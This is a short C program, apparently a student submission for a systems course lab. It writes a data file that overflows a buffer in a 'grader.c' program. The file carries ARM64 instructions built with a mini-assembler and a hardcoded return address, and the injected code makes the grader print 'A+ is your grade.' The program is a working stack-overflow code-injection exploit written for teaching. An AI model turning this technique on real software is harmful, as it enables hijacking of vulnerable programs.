/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* by Andy Nguyen and Icey Ai                                         */
/*--------------------------------------------------------------------*/
#include <stdio.h>
#include "miniassembler.h"

/*--------------------------------------------------------------------*/
/* creates and writes to a file named "dataAplus"                     */
/* does not take inputs                                               */
/* writes to file "dataAplus" using fprintf and fwrite                */
/* "dataAplus" is used to perform a butter overrun on the grader.c    */
/*      file to print out "A+" as the grade.                          */
/*--------------------------------------------------------------------*/

int main(void) {

    char aPlusStr[] = "A+ is your grade.%c";
    unsigned int instr;
    int i;
    FILE *file;
    file = fopen("dataAplus", "w");

    /* Writes our names into the file, buf[0-11]*/
    fprintf(file, "Andy & Icey");
    putc(0, file);

    /* General idea: replace x0 with "A+ is your grade."*/
    /* Put the string in buf[12]-b[31]*/
    fwrite(aPlusStr, sizeof(aPlusStr), 1, file);

    /* Store the address of buf[12] to x0, buf[32]-buf[35]*/
    instr = MiniAssembler_adr(0, 0x420064, 0x420078);
    fwrite(&instr, sizeof(unsigned int), 1, file);

    /* mov '\n' to w1, buf[36]-buf[39]*/
    instr = MiniAssembler_mov(1, '\n');
    fwrite(&instr, sizeof(unsigned int), 1, file);

    /* branch back to printf, buf[40]-buf[44]*/
    instr = MiniAssembler_b(0x400874, 0x420080);
    fwrite(&instr, sizeof(unsigned int), 1, file);

    /* fill rest of buf */
    for (i = 0; i < 4; i++)
        putc(0, file);

    /* goto buf[32] */
    instr = 0x420078;
    fwrite(&instr, sizeof(unsigned int), 1, file);

    fclose(file);
    return 0;
}